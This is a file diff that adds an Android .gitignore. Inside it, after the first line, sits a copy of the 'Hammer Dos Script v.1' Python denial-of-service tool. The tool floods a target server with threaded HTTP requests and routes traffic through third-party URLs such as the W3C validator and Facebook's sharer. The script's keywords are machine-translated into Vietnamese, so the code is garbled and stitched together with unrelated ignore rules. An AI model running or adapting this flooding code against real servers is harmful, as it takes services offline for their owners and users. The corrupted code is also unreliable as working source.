@@ -1,0 +1,247 @@
+# Built application files#! / usr / bin / python3
+# - * - mã hóa: utf-8 - * -
+
+# python 3.3.2+ Hammer Dos Script v.1
+# bởi Can Yalçın
+# chỉ cho mục đích hợp pháp
+
+
+từ  hàng đợi  Nhập  hàng đợi
+từ  optparse  nhập khẩu  OptionParser
+nhập  thời gian , hệ thống , ổ cắm , phân luồng , ghi nhật ký , urllib . yêu cầu , ngẫu nhiên
+
+def  user_agent ():
+	 uagent toàn cầu
+	uagent = []
+	uagent . append ( "Mozilla / 5.0 (tương thích; MSIE 9.0; Windows NT 6.0) Opera 12.14" )
+	uagent . append ( "Mozilla / 5.0 (X11; Ubuntu; Linux i686; rv: 26.0) Gecko / 20100101 Firefox / 26.0" )
+	uagent . append ( "Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3" )
+	uagent . append ( "Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)" )
+	uagent . append ( "Mozilla / 5.0 (Windows NT 6.2) AppleWebKit / 535.7 (KHTML, như Gecko) Comodo_Dragon / 16.1.1.0 Chrome / 16.0.912.63 Safari / 535.7" )
+	uagent . append ( "Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)" )
+	uagent . append ( "Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1" )
+	trở lại ( uagent )
+
+
+def  my_bots ():
+	 bot toàn cầu
+	bot = []
+	bot . append ( "http://validator.w3.org/check?uri=" )
+	bot . append ( "http://www.facebook.com/sharer/sharer.php?u=" )
+	trở lại ( bot )
+
+
+def  bot_hamising ( url ):
+	thử :
+		trong khi  Đúng :
+			req  =  urllib . yêu cầu . urlopen ( urllib . request . Request ( url , headers = { 'User-Agent' : random . choice ( uagent )}))
+			print ( " \ 033 [94mbot đang đập ... \ 033 [0m" )
+			thời gian . ngủ ( .1 )
+	ngoại trừ :
+		thời gian . ngủ ( .1 )
+
+
+def  down_it ( item ):
+	thử :
+		trong khi  Đúng :
+			pack  =  str ( "GET / HTTP / 1.1 \ n Máy chủ:" + máy chủ + " \ n \ n Tác nhân người dùng:" + ngẫu nhiên . lựa chọn ( uagent ) + " \ n " + dữ liệu ). mã hóa ( 'utf-8' )
+			s  =  ổ cắm . ổ cắm ( ổ cắm . AF_INET , ổ cắm . SOCK_STREAM )
+			s . kết nối (( máy chủ , int ( cổng )))
+			nếu  s . sendto ( gói , ( máy chủ , int ( cổng ))):
+				s . tắt máy ( 1 )
+				print ( " \ 033 [92 phút" , time . ctime ( time . time ()), " \ 033 [0m \ 033 [94m <- gói tin đã gửi! búa -> \ 033 [0m" )
+			khác :
+				s . tắt máy ( 1 )
+				print ( " \ 033 [91mshut <-> xuống \ 033 [0m" )
+			thời gian . ngủ ( .1 )
+	ngoại trừ  ổ cắm . lỗi  như  e :
+		print ( " \ 033 [91m không kết nối! máy chủ có thể bị lỗi \ 033 [0m" )
+		#print ("\ 033 [91m", e, "\ 033 [0m")
+		thời gian . ngủ ( .1 )
+
+
+def  dos ():
+	trong khi  Đúng :
+		mục  =  q . get ()
+		down_it ( item )
+		q . task_done ()
+
+
+def  dos2 ():
+	trong khi  Đúng :
+		item = w . get ()
+		bot_hamoing ( ngẫu nhiên . lựa chọn ( bot ) + "http: //" + máy chủ )
+		w . task_done ()
+
+
+ cách sử dụng def ():
+	print ( '' ' \ 033 [92m Hammer Dos Script v.1 http://www.canyalcin.com/
+	Người dùng cuối có trách nhiệm tuân theo tất cả các luật hiện hành.
+	Nó chỉ dành cho tập lệnh thử nghiệm máy chủ. IP của bạn được hiển thị. \ n
+	cách sử dụng: python3 hammer.py [-s] [-p] [-t]
+	-h: giúp
+	-s: ip máy chủ
+	-p: cổng mặc định 80
+	-t: turbo mặc định 135 \ 033 [0m '' ' )
+	sys . thoát ra ()
+
+
+def  get_parameters ():
+	 máy chủ toàn cầu
+	 cảng toàn cầu
+	 thr toàn cầu
+	 mặt hàng toàn cầu
+	optp  =  OptionParser ( add_help_option = False , Epilog = "Hammers" )
+	optp . add_option ( "-q" , "--quiet" , help = "đặt ghi nhật ký thành LỖI" , action = "store_const" , dest = "loglevel" , const = logging . ERROR , default = ghi nhật ký . THÔNG TIN )
+	optp . add_option ( "-s" , "--server" , dest = "host" , help = "tấn công vào ip máy chủ -s ip" )
+	optp . add_option ( "-p" , "--port" , type = "int" , dest = "port" , help = "-p 80 default 80" )
+	optp . add_option ( "-t" , "--turbo" , type = "int" , dest = "turbo" , help = "default 135 -t 135" )
+	optp . add_option ( "-h" , "--help" , dest = "help" , action = 'store_true' , help = "help you" )
+	opts , args  =  optp . parse_args ()
+	khai thác gỗ . basicConfig ( level = opts . loglevel , format = '% (levelname) -8s% (message) s' )
+	nếu  chọn . giúp đỡ :
+		sử dụng ()
+	nếu  chọn . máy chủ  không phải là  Không có : 
+		host  =  opts . tổ chức
+	khác :
+		sử dụng ()
+	nếu  chọn . cổng  là  Không :
+		cổng  =  80
+	khác :
+		port  =  opts . Hải cảng
+	nếu  chọn . turbo  là  Không có :
+		thr  =  135
+	khác :
+		thr  =  opts . bộ tăng áp
+
+
+# đọc tiêu đề
+ dữ liệu toàn cầu
+headers  =  open ( "headers.txt" , "r" )
+data  =  tiêu đề . đọc ()
+tiêu đề . đóng ()
+Hàng đợi #task là q, w
+q  =  Hàng đợi ()
+w  =  Hàng đợi ()
+
+
+nếu  __name__  ==  '__main__' :
+	nếu  len ( sys . argv ) <  2 :
+		sử dụng ()
+	get_parameters ()
+	print ( " \ 033 [92m" , máy chủ lưu trữ , "cổng:" , str ( cổng ), "turbo:" , str ( thr ), " \ 033 [0m" )
+	print ( " \ 033 [94m. Vui lòng đợi ... \ 033 [0m" )
+	user_agent ()
+	my_bots ()
+	thời gian . ngủ ( 5 )
+	thử :
+		s  =  ổ cắm . ổ cắm ( ổ cắm . AF_INET , ổ cắm . SOCK_STREAM )
+		s . kết nối (( máy chủ , int ( cổng )))
+		s . thời gian chờ ( 1 )
+	ngoại trừ  ổ cắm . lỗi  như  e :
+		print ( " \ 033 [91mkiểm tra ip và cổng máy chủ \ 033 [0m" )
+		sử dụng ()
+	trong khi  Đúng :
+		cho  tôi  trong  phạm vi ( int ( thr )):
+			t  =  luồng . Chủ đề ( target = dos )
+			t . daemon  =  True   # nếu luồng tồn tại, nó sẽ chết
+			t . start ()
+			t2  =  luồng . Chủ đề ( target = dos2 )
+			t2 . daemon  =  True   # nếu luồng tồn tại, nó sẽ chết
+			t2 . start ()
+		bắt đầu  =  thời gian . thời gian ()
+		#tasking
+		item  =  0
+		trong khi  Đúng :
+			if ( item > 1800 ): # để không bị lỗi bộ nhớ
+				item = 0
+				thời gian . ngủ ( .1 )
+			item  =  item  +  1
+			q . đặt ( mục )
+			w . đặt ( mục )
+		q . tham gia ()
+		w . tham gia ()
+*.apk
+*.aar
+*.ap_
+*.aab
+
+# Files for the ART/Dalvik VM
+*.dex
+
+# Java class files
+*.class
+
+# Generated files
+bin/
+gen/
+out/
+#  Uncomment the following line in case you need and you don't have the release build type files in your app
+# release/
+
+# Gradle files
+.gradle/
+build/
+
+# Local configuration file (sdk path, etc)
+local.properties
+
+# Proguard folder generated by Eclipse
+proguard/
+
+# Log Files
+*.log
+
+# Android Studio Navigation editor temp files
+.navigation/
+
+# Android Studio captures folder
+captures/
+
+# IntelliJ
+*.iml
+.idea/workspace.xml
+.idea/tasks.xml
+.idea/gradle.xml
+.idea/assetWizardSettings.xml
+.idea/dictionaries
+.idea/libraries
+# Android Studio 3 in .gitignore file.
+.idea/caches
+.idea/modules.xml
+# Comment next line if keeping position of elements in Navigation Editor is relevant for you
+.idea/navEditor.xml
+
+# Keystore files
+# Uncomment the following lines if you do not want to check your keystore files in.
+#*.jks
+#*.keystore
+
+# External native build folder generated in Android Studio 2.2 and later
+.externalNativeBuild
+.cxx/
+
+# Google Services (e.g. APIs or Firebase)
+# google-services.json
+
+# Freeline
+freeline.py
+freeline/
+freeline_project_description.json
+
+# fastlane
+fastlane/report.xml
+fastlane/Preview.html
+fastlane/screenshots
+fastlane/test_output
+fastlane/readme.md
+
+# Version control
+vcs.xml
+
+# lint
+lint/intermediates/
+lint/generated/
+lint/outputs/
+lint/tmp/
+# lint/reports/
